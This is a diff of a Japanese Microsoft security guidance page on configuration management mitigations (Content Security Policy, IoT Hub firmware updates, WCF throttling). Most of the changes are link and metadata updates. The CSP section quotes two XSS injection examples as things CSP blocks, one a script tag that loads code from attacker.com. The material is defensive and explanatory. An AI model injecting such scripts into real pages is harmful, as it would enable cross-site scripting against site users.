@@ -14,12 +14,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 08/17/2017
 ms.author: rodsan
-ms.openlocfilehash: cea96234083abd01cdf280129e6f75a1f69af9c6
-ms.sourcegitcommit: 150a40d8ba2beaf9e22b6feff414f8298a8ef868
+ms.openlocfilehash: 5b9ef9691d3d9b9aaced3ad2aaa54e6cfc03fa14
+ms.sourcegitcommit: 0b4da003fc0063c6232f795d6b67fa8101695b61
 ms.translationtype: HT
 ms.contentlocale: ja-JP
-ms.lasthandoff: 06/27/2018
-ms.locfileid: "37028984"
+ms.lasthandoff: 07/05/2018
+ms.locfileid: "37857448"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>セキュリティ フレーム: 構成管理 | 対応策 
 | 製品/サービス | 記事 |
@@ -42,7 +42,7 @@ ms.locfileid: "37028984"
 | **SDL フェーズ**               | 構築 |  
 | **適用できるテクノロジ** | ジェネリック |
 | **属性**              | 該当なし  |
-| **参照**              | [コンテンツ セキュリティ ポリシーの概要](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[コンテンツ セキュリティ ポリシー リファレンス](http://content-security-policy.com/)、[セキュリティ機能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[コンテンツ セキュリティ ポリシーの概要](https://docs.webplatform.org/wiki/tutorials/content-security-policy)、[CSP が使用可能か](http://caniuse.com/#feat=contentsecuritypolicy) |
+| **参照**              | [コンテンツ セキュリティ ポリシーの概要](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[コンテンツ セキュリティ ポリシー リファレンス](http://content-security-policy.com/)、[セキュリティ機能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[コンテンツ セキュリティ ポリシーの概要](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)、[CSP が使用可能か](http://caniuse.com/#feat=contentsecuritypolicy) |
 | **手順** | <p>コンテンツ セキュリティ ポリシー (CSP) は、W3C 標準の多層防御セキュリティ メカニズムです。このポリシーを使用すると、Web アプリケーション所有者が、自身のサイトに埋め込まれたコンテンツを制御できます。 CSP は、Web サーバー上で HTTP 応答ヘッダーとして追加され、ブラウザーによってクライアント側で適用されます。 これはホワイトリスト ベースのポリシーで、Web サイトが、信頼されたドメインのセットを宣言できます。このドメインから、JavaScript などのアクティブ コンテンツを読み込むことができます。</p><p>CSP のセキュリティ上の利点を次に示します。</p><ul><li>**XSS に対する保護:** ページが XSS に対して脆弱である場合、攻撃者がそれを悪用する方法は 2 つあります。<ul><li>`<script>malicious code</script>` を挿入する。 このエクスプロイトは、CSP の基本制限 1 により動作しません</li><li>`<script src=”http://attacker.com/maliciousCode.js”/>` を挿入する。 攻撃者が制御するドメインは、ドメインの CSP のホワイトリストに追加されないため、このエクスプロイトは動作しません</li></ul></li><li>**データ流出の制御:** Web ページの悪意のあるコンテンツが外部 Web サイトに接続して、データを盗もうとすると、CSP によって接続が中断されます。 接続先ドメインは、CSP のホワイトリストに追加されないためです</li><li>**クリックジャッキングに対する防御:** クリックジャッキングは、敵が正規の Web サイトを偽装して、ユーザーに UI 要素を強制的にクリックさせる攻撃方法です。 現時点では、クリックジャッキングに対する防御は、X-Frame-Options 応答ヘッダーを構成することで実現します。 すべてのブラウザーがこのヘッダーを使用しているわけではありません。今後は、CSP がクリックジャッキングに対する標準的な防御方法になります</li><li>**リアルタイム攻撃レポート:** CSP 対応の Web サイトがインジェクション攻撃を受けると、Web サーバーで構成されているエンドポイントへの通知が自動的にトリガーされます。 このように、CSP は、リアルタイムの警告システムとして機能します。</li></ul> |
 
 ### <a name="example"></a>例
@@ -562,7 +562,7 @@ public void ConfigureServices(IServiceCollection services)
 | **SDL フェーズ**               | 構築 |  
 | **適用できるテクノロジ** | ジェネリック |
 | **属性**              | ゲートウェイの選択 - Azure IoT Hub |
-| **参照**              | [IoT Hub を使用したデバイス管理の概要](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/)、[デバイス ファームウェアの更新方法](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
+| **参照**              | [IoT Hub を使用したデバイス管理の概要](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/)、[デバイス ファームウェアの更新方法](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
 | **手順** | LWM2M は、IoT デバイス管理の Open Mobile Alliance のプロトコルです。 Azure の IoT デバイス管理では、デバイスのジョブを使用して物理デバイスと対話することができます。 Azure IoT Hub デバイス管理を使用して、デバイスおよびその他の構成データを定期的に最新の状態に保つためのプロセスが、クラウド ゲートウェイで実装されていることを確認します。 |
 
 ## <a id="controls-policies"></a>デバイスのエンドポイント セキュリティ制御が組織ポリシーに従って構成されていることを確認する
@@ -607,7 +607,8 @@ public void ConfigureServices(IServiceCollection services)
 | **適用できるテクノロジ** | .NET Framework 3 |
 | **属性**              | 該当なし  |
 | **参照**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx)、[Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
-| **手順** | <p>システム リソースの使用に制限を設定しないと、リソースが使い果たされ、最終的にはサービス拒否攻撃につながる可能性があります。</p><ul><li>**説明:** Windows Communication Foundation (WCF) は、サービス要求をスロットルする機能を提供します。 許可するクライアント要求が多すぎると、システムに要求が殺到し、リソースが使い果たされる可能性があります。 一方、サービスへの要求を許可する数が少なすぎると、正当なユーザーがサービスを使用できなくなる場合があります。 各サービスを個別に調整および構成して、適切な量のリソースを許可する必要があります。</li><li>**推奨** WCF のサービス調整機能を有効にして、アプリケーションに適した制限を設定してください。</li></ul>|
+| **手順** | <p>システム リソースの使用に制限を設定しないと、リソースが使い果たされ、最終的にはサービス拒否攻撃につながる可能性があります。</p><ul><li>
+  **説明:** Windows Communication Foundation (WCF) は、サービス要求をスロットルする機能を提供します。 許可するクライアント要求が多すぎると、システムに要求が殺到し、リソースが使い果たされる可能性があります。 一方、サービスへの要求を許可する数が少なすぎると、正当なユーザーがサービスを使用できなくなる場合があります。 各サービスを個別に調整および構成して、適切な量のリソースを許可する必要があります。</li><li>**推奨** WCF のサービス調整機能を有効にして、アプリケーションに適した制限を設定してください。</li></ul>|
 
 ### <a name="example"></a>例
 調整が有効になっている構成の例は次のとおりです。
